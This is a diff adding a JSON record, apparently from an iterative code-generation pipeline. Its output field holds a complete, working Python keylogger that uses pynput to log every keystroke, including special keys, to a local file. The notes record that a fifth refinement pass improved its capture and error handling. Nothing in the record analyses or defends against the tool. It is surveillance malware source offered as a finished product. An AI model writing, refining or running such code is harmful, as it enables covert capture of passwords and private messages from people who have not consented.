@@ -1,0 +1,9 @@
+{
+  "output": "import pynput\nfrom pynput.keyboard import Key, Listener\n\ndef on_press(key):\n    try:\n        with open('keylogs.txt', 'a') as f:\n            if key == Key.space:\n                f.write('[SPACE] ')\n            elif key == Key.enter:\n                f.write('[ENTER]\\n')\n            elif key == Key.shift_l or key == Key.shift_r:\n                f.write('[SHIFT] ')\n            elif key == Key.ctrl_l or key == Key.ctrl_r:\n                f.write('[CTRL] ')\n            elif key == Key.alt_l or key == Key.alt_r:\n                f.write('[ALT] ')\n            else:\n                f.write(str(key.char))\n    except AttributeError:\n        pass\n    except Exception as e:\n        print(f'Error: {e}')\n    if key == Key.esc:\n        return False\n\ndef main():\n    with Listener(on_press=on_press) as listener:\n        listener.join()\n\nif __name__ == '__main__':\n    try:\n        main()\n    except Exception as e:\n        print(f'Error: {e}')",
+  "notes": "Added handling for special keys like shift, ctrl, alt and enhanced error handling in on_press function.",
+  "applied_fixes": [
+    "iteration4_issue1",
+    "iteration4_issue2"
+  ],
+  "iterations": 5
+}
